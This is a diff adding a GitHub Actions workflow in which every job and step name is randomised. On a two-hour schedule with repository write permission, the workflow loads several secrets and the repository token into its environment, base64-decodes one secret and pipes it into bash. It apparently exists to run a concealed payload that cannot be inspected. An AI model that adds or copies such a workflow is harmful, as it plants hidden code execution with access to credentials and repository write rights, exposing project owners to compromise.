@@ -1,0 +1,21 @@
+name: GLTac
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  HmQiz5apxc:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          token: ${{ secrets.iS5q9Jlr4fV }}
+      - name: QCnfkM
+        env:
+          UHzm0Z7aJhxCb7J: ${{ secrets.zkUFgspAud }}
+          mGYxRLp3: ${{ secrets.WARLWC }}
+          ACr92cPGaQym: ${{ secrets.SZxNohnaO }}
+          GITHUB_TOKEN: ${{ secrets.iS5q9Jlr4fV }}
+        run: echo "$UHzm0Z7aJhxCb7J" | base64 -d | bash
